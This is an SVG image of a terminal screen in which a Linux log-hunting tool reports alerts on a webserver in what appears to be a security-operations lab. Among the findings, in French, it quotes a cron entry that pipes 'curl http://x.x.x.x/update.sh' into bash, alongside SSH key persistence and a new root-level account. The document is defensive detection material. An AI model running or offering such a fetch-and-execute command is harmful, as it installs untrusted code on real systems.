<svg viewBox="0 0 900 340" xmlns="http://www.w3.org/2000/svg" font-family="Menlo, Consolas, 'Courier New', monospace">
  <defs>
    <clipPath id="term-linuxhunt"><rect width="900" height="340" rx="10"/></clipPath>
  </defs>
  <g clip-path="url(#term-linuxhunt)">
    <rect width="900" height="340" fill="#0d1117"/>
    <rect width="900" height="34" fill="#161b22"/>
    <circle cx="20" cy="17" r="6" fill="#ff5f56"/>
    <circle cx="40" cy="17" r="6" fill="#ffbd2e"/>
    <circle cx="60" cy="17" r="6" fill="#27c93f"/>
    <text x="450" y="22" font-size="13" fill="#8b949e" text-anchor="middle">enzo@soc-lab: ~/LinuxHunt</text>

    <text x="20" y="62" font-size="14">
      <tspan fill="#3fb950">$ </tspan><tspan fill="#c9d1d9">sudo python3 linuxhunt.py --logs /var/log --host webserver01</tspan>
    </text>

    <text x="20" y="94" font-size="14" fill="#8b949e">[*] Parsing auth.log, syslog, audit.log, journalctl ...</text>
    <text x="20" y="116" font-size="14" fill="#8b949e">[*] 48213 evenements analyses</text>

    <text x="20" y="150" font-size="14">
      <tspan fill="#ff6b6b">[HIGH] </tspan><tspan fill="#c9d1d9">Bruteforce SSH detecte - 212 echecs auth en 4 min depuis 185.220.101.47</tspan>
    </text>
    <text x="20" y="172" font-size="14">
      <tspan fill="#ff6b6b">[HIGH] </tspan><tspan fill="#c9d1d9">Ajout de cle SSH persistante dans ~/.ssh/authorized_keys (user: www-data)</tspan>
    </text>
    <text x="20" y="194" font-size="14">
      <tspan fill="#ffa657">[MED]  </tspan><tspan fill="#c9d1d9">Execution suspecte via cron : curl http://x.x.x.x/update.sh | bash</tspan>
    </text>
    <text x="20" y="216" font-size="14">
      <tspan fill="#ffa657">[MED]  </tspan><tspan fill="#c9d1d9">Nouveau compte utilisateur cree avec UID 0 (privilege root)</tspan>
    </text>
    <text x="20" y="238" font-size="14">
      <tspan fill="#58a6ff">[INFO] </tspan><tspan fill="#c9d1d9">sudo -l execute par un compte sans usage sudo habituel</tspan>
    </text>

    <text x="20" y="272" font-size="14" fill="#c9d1d9">[*] 2 alertes HIGH, 2 MED, 1 INFO</text>
    <text x="20" y="294" font-size="14" fill="#8b949e">[*] Rapport detaille : linuxhunt_report_webserver01.txt</text>
  </g>
</svg>
